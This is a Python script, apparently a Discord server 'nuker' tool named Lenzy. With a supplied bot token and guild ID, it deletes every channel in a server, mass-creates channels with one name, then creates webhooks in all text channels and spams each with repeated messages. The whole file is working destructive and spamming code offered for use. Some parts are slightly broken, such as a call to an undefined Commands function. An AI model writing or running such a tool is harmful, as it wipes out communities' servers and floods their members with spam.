import asyncio
import aiohttp
import os
import time
from datetime import datetime
from pystyle import Colors, Colorate, Center

import os
 
 
async def delete_channels(session):
    async with session.get(f'https://discord.com/api/v9/guilds/{guild_id}/channels', headers=headers) as r:
        channels = await r.json()

    for channel in channels:
        channel_id = channel['id']
        while True:
            try:
                async with session.delete(f'https://discord.com/api/v9/channels/{channel_id}', headers=headers) as r:
                    if r.status == 429:
                        print(Colorate.Horizontal(Colors.red_to_white,(f" You got ratelimited retrying soon >> {channel_id}")))
                    elif r.status in [200, 201, 204]:
                        print(Colorate.Horizontal(Colors.blue_to_cyan,(f" Channels successfully deleted >> {channel_id}")))
                        break
                    else:
                        print(Colorate.Horizontal(Colors.red_to_white,(f" Failed to delete >> {channel_id} status code: {r.status}")))
                        break
            except Exception as e:
                print(f"\033[90m{(' %H:%M:%S.%f - ')}\x1b[38;5;196mCouldn't Delete Channel {channel_id}, Exception: {e}")
                os.system('cls' if os.name == 'nt' else 'clear')

async def create_channels(session):
    channel_name = input(Colorate.Horizontal(Colors.blue_to_cyan,(" Channel Name>>")))
    num_channels = int(input(Colorate.Horizontal(Colors.blue_to_cyan,(" Amount>>"))))
    
    for _ in range(num_channels):
        while True:
            try:
                async with session.post(f'https://discord.com/api/v9/guilds/{guild_id}/channels', headers=headers, json={'name': channel_name, 'type': 0}) as r:
                    if r.status == 429:
                        print(Colorate.Horizontal(Colors.red_to_white,(f" You got ratelimited retrying soon >> {guild_id}")))
                    elif r.status in [200, 201, 204]:
                        print(Colorate.Horizontal(Colors.blue_to_cyan,(f" Channels successfully created >> {guild_id}")))
                        break
                    else:
                        print(Colorate.Horizontal(Colors.red_to_white,(f" Failed to delete >> {guild_id} status code: {r.status}")))
                        break
            except Exception as e:
                print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;196mCouldn't Create Channel to {guild_id}, Exception: {e}")
                os.system('cls' if os.name == 'nt' else 'clear')

async def send_message(hook, message, amount: int):
    async with aiohttp.ClientSession() as session:
        for _ in range(amount):
            await session.post(hook, json={'content': message, 'tts': False})
            await asyncio.sleep(0.1)  # Change this wich one u want gang 0.1 is the fastest

async def WebhookSpam(session):
    webhook_name = input(Colorate.Horizontal(Colors.blue_to_cyan,(" WebHook Name>>")))
    msg = input(Colorate.Horizontal(Colors.blue_to_cyan,(" Message To Spam>>")))
    msg_amt = int(input(Colorate.Horizontal(Colors.blue_to_cyan,(" Amount>>"))))


    async with session.get(f'https://discord.com/api/v9/guilds/{guild_id}/channels', headers=headers) as r:
        channels = await r.json()
        spam_tasks = []  

        for channel in channels:
            if channel['type'] == 0:  
                try:
                    async with session.post(f'https://discord.com/api/v9/channels/{channel["id"]}/webhooks', headers=headers, json={'name': webhook_name}) as r:
                        if r.status == 429:
                            print(Colorate.Horizontal(Colors.red_to_white,(f" You got ratelimited retrying soon!")))
                        elif r.status in [200, 201, 204]:
                            webhook_raw = await r.json()
                            webhook_url = f'https://discord.com/api/webhooks/{webhook_raw["id"]}/{webhook_raw["token"]}'
                            print(Colorate.Horizontal(Colors.blue_to_cyan,(f" Created successfully webhook >> {webhook_name} for {channel['name']} (ID: {channel['id']})")))
                            spam_tasks.append(send_message(webhook_url, msg, msg_amt))  # Add to the spam tasks
                        else:
                            print(Colorate.Horizontal(Colors.red_to_white,(f" Failed to delete >> status code: {r.status}")))
                except Exception as e:
                    print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;196mException occurred while creating webhook: {e}")

        
        await asyncio.gather(*spam_tasks)
        os.system('cls' if os.name == 'nt' else 'clear')



async def main():
    global headers, guild_id
    token = input(Colorate.Horizontal(Colors.blue_to_cyan,(" Enter your bot token: ")))
    guild_id = input(Colorate.Horizontal(Colors.blue_to_cyan,(" Enter your guild ID: ")))
    name = input(Colorate.Horizontal(Colors.blue_to_cyan,(" Enter your username: ")))
    
    os.system(f'title ^| • Lenzy ^| Discord.gg/zeiixp ^| • PRENIUM ^| • USER^>{name} ^|')
    
    headers = {
        "Authorization": f"Bot {token}",
        "Content-Type": "application/json"
    }
    os.system('cls' if os.name == 'nt' else 'clear')

    while True:
        print(Colorate.Horizontal(Colors.blue_to_cyan,(r"""
              
                                     /$$                                                                   
                                    | $$                                              
                                    | $$        /$$$$$$  /$$$$$$$  /$$$$$$$$ /$$   /$$
                                    | $$       /$$__  $$| $$__  $$|____ /$$/| $$  | $$
                                    | $$      | $$$$$$$$| $$  \ $$   /$$$$/ | $$  | $$
                                    | $$      | $$_____/| $$  | $$  /$$__/  | $$  | $$
                                    | $$$$$$$$|  $$$$$$$| $$  | $$ /$$$$$$$$|  $$$$$$$
                                    |________/ \_______/|__/  |__/|________/ \____  $$
                                                                             /$$  | $$
                                                        Version:1.0         |  $$$$$$/
                                                                             \______/ """)))
        
        choice = input(Colorate.Horizontal(Colors.blue_to_cyan,(" Press Enter To Start>>")))

        async with aiohttp.ClientSession() as session:
                await delete_channels(session)
                await create_channels(session)
                await WebhookSpam(session)
                await Commands(session)

        
        time.sleep(5)
        os.system('cls' if os.name == 'nt' else 'clear')
asyncio.run(main())
os.system('cls' if os.name == 'nt' else 'clear')